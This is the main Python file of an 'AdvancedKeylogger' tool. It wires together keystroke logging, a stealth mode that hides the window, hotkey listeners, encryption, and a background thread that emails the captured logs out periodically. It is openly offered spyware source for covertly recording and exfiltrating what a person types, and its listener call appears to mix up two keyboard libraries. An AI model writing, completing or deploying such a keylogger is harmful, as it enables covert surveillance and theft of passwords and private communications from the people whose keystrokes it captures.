import tkinter as tk
from gui import KeyloggerGUI
from logger import Logger
from encryption import Encryption
from emailer import Emailer
from settings import Settings
from themes import Themes
from utils import play_sound, optimize_performance, get_network_status
import pygame  # Add this line
import threading
import keyboard

class AdvancedKeylogger:
    def __init__(self):
        self.root = tk.Tk()
        self.settings = Settings()
        self.logger = Logger(self.settings)
        self.encryption = Encryption()
        self.emailer = Emailer(self.settings, self.encryption)
        self.themes = Themes()
        self.gui = KeyloggerGUI(self.root, self)
        self.is_logging = False
        self.is_stealth = False
        self.is_paused = False
        self.hotkey_listener = None
        self.mouse_listener = None
        pygame.mixer.init()
        self.start_hotkey_listener()
        optimize_performance()

    def start_hotkey_listener(self):
        def on_hotkey(key):
            try:
                key_str = str(key).replace("Key.", "").lower()
                if key_str == self.settings.config["hotkeys"]["stealth"]:
                    self.toggle_stealth()
                elif key_str == self.settings.config["hotkeys"]["pause"]:
                    self.pause_logging()
            except:
                pass
        self.hotkey_listener = keyboard.Listener(on_press=on_hotkey)
        self.hotkey_listener.start()

    def restart_hotkey_listener(self):
        if self.hotkey_listener:
            self.hotkey_listener.stop()
        self.start_hotkey_listener()

    def start_logging(self):
        self.logger.start_logging()
        self.is_logging = True
        self.is_paused = False
        self.gui.update_status("Status: Logging started...")
        if self.settings.config["email_config"]["enabled"]:
            threading.Thread(target=self.emailer.email_logs_periodically, daemon=True).start()
        threading.Thread(target=self.logger.auto_save_logs, daemon=True).start()

    def stop_logging(self):
        self.logger.stop_logging()
        self.is_logging = False
        self.is_paused = False
        self.gui.update_status("Status: Logging stopped.")

    def pause_logging(self):
        if self.is_logging and not self.is_paused:
            self.is_paused = True
            self.gui.update_status("Status: Logging paused.")
        elif self.is_logging and self.is_paused:
            self.is_paused = False
            self.gui.update_status("Status: Logging resumed.")

    def toggle_stealth(self):
        self.is_stealth = not self.is_stealth
        if self.is_stealth:
            self.root.withdraw()
            self.gui.update_status("Status: Stealth mode enabled.")
        else:
            self.root.deiconify()
            self.gui.update_status("Status: Stealth mode disabled.")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = AdvancedKeylogger()
    app.run()